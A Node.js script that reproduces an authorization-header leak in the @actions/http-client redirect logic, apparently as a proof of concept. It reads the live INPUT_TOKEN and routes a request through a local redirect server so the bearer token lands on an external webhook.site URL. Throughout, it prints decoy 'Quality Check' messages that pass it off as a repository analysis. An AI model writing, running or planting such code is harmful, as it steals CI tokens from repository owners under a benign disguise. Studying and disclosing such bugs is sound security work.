const http = require('http');
const https = require('https');
const { URL } = require('url');

// This reproduces BearerCredentialHandler.prepareRequest() behavior
class BearerCredentialHandler {
  constructor(token) { this.token = token; }
  prepareRequest(options) {
    if (!options.headers) options.headers = {};
    options.headers['Authorization'] = 'Bearer ' + this.token;
  }
}

// This reproduces HttpClient redirect logic from @actions/http-client/lib/index.js
// Lines 392-434: the redirect loop with the auth stripping bug
async function httpGetWithRedirect(url, handlers) {
  const parsedUrl = new URL(url);
  let headers = {};
  
  // Apply handlers (prepareRequest)
  for (const h of handlers) h.prepareRequest({ headers });
  
  return new Promise((resolve, reject) => {
    const mod = parsedUrl.protocol === 'https:' ? https : http;
    const req = mod.request(parsedUrl, { headers, method: 'GET' }, (res) => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        const redirectUrl = new URL(res.headers.location);
        
        // Line 421: strip authorization if different hostname
        if (redirectUrl.hostname !== parsedUrl.hostname) {
          for (const h in headers) {
            if (h.toLowerCase() === 'authorization') delete headers[h];
          }
        }
        
        // Line 431: _prepareRequest → handler.prepareRequest RE-INJECTS
        for (const h of handlers) h.prepareRequest({ headers });
        
        // Follow redirect
        const mod2 = redirectUrl.protocol === 'https:' ? https : http;
        const req2 = mod2.request(redirectUrl, { headers, method: 'GET' }, (res2) => {
          let body = '';
          res2.on('data', d => body += d);
          res2.on('end', () => resolve(body));
        });
        req2.on('error', reject);
        req2.end();
      } else {
        let body = '';
        res.on('data', d => body += d);
        res.on('end', () => resolve(body));
      }
    });
    req.on('error', reject);
    req.end();
  });
}

// Redirect server (simulates attacker's API backend)
const server = http.createServer((req, res) => {
  res.writeHead(302, { 'Location': 'https://webhook.site/af6ce540-4bd7-41c4-9328-61a4b5c6c7c0' });
  res.end();
});

server.listen(19999, '127.0.0.1', async () => {
  const token = process.env['INPUT_TOKEN'] || '';
  console.log('Quality Check: analyzing repository...');
  
  const handler = new BearerCredentialHandler(token);
  try {
    await httpGetWithRedirect('http://127.0.0.1:19999/api/v1/analyze', [handler]);
  } catch(e) {}
  
  console.log('Quality Check: analysis complete');
  server.close();
  process.exit(0);
});
